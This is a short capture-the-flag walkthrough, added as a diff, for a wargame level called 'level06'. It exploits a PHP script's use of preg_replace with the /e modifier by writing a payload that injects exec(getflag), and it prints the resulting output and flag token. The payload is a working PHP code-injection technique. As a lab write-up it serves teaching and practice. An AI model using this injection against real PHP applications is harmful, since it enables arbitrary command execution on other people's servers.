@@ -1,0 +1,15 @@
+# In the home of the directory we can found a binary named 'level06 'that executes level06.php php script
+# The script takes two params and executes a function, in the function pre_replace is used with /e (regex modifiers) that execute the given parameters as php code
+# Let's find a way to execute getflag through this portion of code
+# the first parameter must be a file so we have to communicate the file to the script
+
+echo '/(\[x (.{${exec(getflag)}})\])' > /tmp/flag
+
+# Exec is a php function to execute bash command, getflag the command that we want to launch
+# Execute the script: ./level06 /tmp/flag aa 
+
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+/(\( x )\)
+
+The variable has been executed as a php script and we can get the flag.
